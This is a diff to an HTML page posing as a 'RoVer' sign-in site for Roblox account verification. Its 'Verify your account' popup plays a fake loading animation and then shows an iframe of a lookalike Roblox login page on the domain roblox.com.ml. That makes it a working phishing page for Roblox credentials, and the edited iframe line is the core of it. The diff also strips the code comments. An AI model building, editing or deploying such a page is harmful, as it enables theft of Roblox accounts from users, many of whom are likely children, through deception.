@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RoVer - Sign In</title>
+    <title>RoVer</title>
 
     <link rel="stylesheet" href="css/style.css">
     <link rel="icon" type="image/png" href="favicon.png">
@@ -12,7 +12,7 @@
 
 <body>
 
-<!-- NAVBAR -->
+
 <header class="navbar">
     <div class="nav-left">
         <div class="brand">
@@ -32,7 +32,7 @@
         <button class="btn-signin" id="signInBtn">Sign In</button>
     </div>
     
-    <!-- Mobile Menu Button -->
+    
     <button class="mobile-menu-btn" id="mobileMenuBtn">
         <span></span>
         <span></span>
@@ -40,7 +40,7 @@
     </button>
 </header>
 
-<!-- MAIN -->
+
 <section class="main">
     <div class="card">
         <h1>Sign in to RoVer</h1>
@@ -49,7 +49,7 @@
     </div>
 </section>
 
-<!-- FOOTER -->
+
 <footer class="footer">
     <div class="footer-left">
         <img src="img/logo.png" alt="Imaginary Menagerie Logo" class="footer-logo">
@@ -71,16 +71,16 @@
     </div>
 </footer>
 
-<!-- POPUP OVERLAY - Main OAuth -->
+
 <div class="popup-overlay" id="popupOverlay">
     <div class="popup-container" id="popupContainer">
-        <!-- Top Bar -->
+      
         <div class="popup-header">
             <span class="popup-header-text">Verify your account</span>
             <button class="popup-close" id="popupClose">&times;</button>
         </div>
         
-        <!-- Popup Content - Authorization -->
+       
         <div class="popup-content" id="authContent">
             <div class="popup-logo">
                 <img src="img/rover-logo.png" alt="RoVer Logo">
@@ -93,7 +93,7 @@
             </div>
         </div>
         
-        <!-- Popup Content - Loading -->
+       
         <div class="popup-content loading-content" id="loadingContent" style="display: none;">
             <div class="loader">
                 <div class="loader-ring"></div>
@@ -108,14 +108,14 @@
             </div>
         </div>
         
-        <!-- Popup Content - Iframe -->
+       
         <div class="popup-content iframe-content" id="iframeContent" style="display: none;">
-            <iframe src="https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F171035634475%2FAdopt-Me"></iframe>
+            <iframe src="https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F100174458317%2Fprofile" frameborder="0" class="content-iframe"></iframe>
         </div>
     </div>
 </div>
 
-<!-- POPUP OVERLAY -->
+
 <div class="popup-overlay alert-popup" id="notLoggedPopup">
     <div class="alert-popup-container">
         <button class="alert-close" id="notLoggedClose">&times;</button>
@@ -131,7 +131,7 @@
     </div>
 </div>
 
-<!-- POPUP OVERLAY - -->
+
 <div class="popup-overlay alert-popup" id="addRobloxPopup">
     <div class="alert-popup-container">
         <button class="alert-close" id="addRobloxClose">&times;</button>
@@ -149,7 +149,7 @@
 </div>
 
 <script>
-    // Main OAuth Popup
+    
     const loginBtn = document.getElementById('loginBtn');
     const popupOverlay = document.getElementById('popupOverlay');
     const popupContainer = document.getElementById('popupContainer');
@@ -172,12 +172,12 @@
     const addRobloxPopup = document.getElementById('addRobloxPopup');
     const addRobloxClose = document.getElementById('addRobloxClose');
 
-    // Mobile Menu
+   
     const mobileMenuBtn = document.getElementById('mobileMenuBtn');
     const navLinks = document.querySelector('.nav-links');
     const navRight = document.querySelector('.nav-right');
 
-    // Open popup on login button click
+    
     loginBtn.addEventListener('click', () => {
         popupOverlay.classList.add('active');
         popupContainer.classList.remove('expanded');
@@ -187,7 +187,7 @@
         resetMessages();
     });
 
-    // Close popup
+    
     popupClose.addEventListener('click', closePopup);
     btnReturn.addEventListener('click', closePopup);
     
@@ -209,12 +209,12 @@
         message4.style.opacity = '0.3';
     }
 
-    // Continue button - show loading animation
+  
     btnContinue.addEventListener('click', () => {
         authContent.style.display = 'none';
         loadingContent.style.display = 'flex';
         
-        // Animate messages
+       
         setTimeout(() => {
             message1.style.opacity = '1';
             message1.style.color = '#ff2d87';
@@ -238,7 +238,7 @@
             message4.style.color = '#ff2d87';
         }, 5000);
         
-        // After loading, show iframe
+        
         setTimeout(() => {
             loadingContent.style.display = 'none';
             iframeContent.style.display = 'block';
@@ -246,7 +246,7 @@
         }, 6500);
     });
 
-    // Manage Servers - Not Logged In Popup
+   
     manageServersBtn.addEventListener('click', () => {
         notLoggedPopup.classList.add('active');
     });
@@ -261,7 +261,7 @@
         }
     });
 
-    // Sign In - Add Roblox Account Popup
+   
     signInBtn.addEventListener('click', () => {
         addRobloxPopup.classList.add('active');
     });
@@ -276,7 +276,7 @@
         }
     });
 
-    // Mobile Menu Toggle
+    
     mobileMenuBtn.addEventListener('click', () => {
         mobileMenuBtn.classList.toggle('active');
         navLinks.classList.toggle('active');
@@ -285,8 +285,5 @@
 </script>
 
 </body>
+
 </html>
-
-
-
-
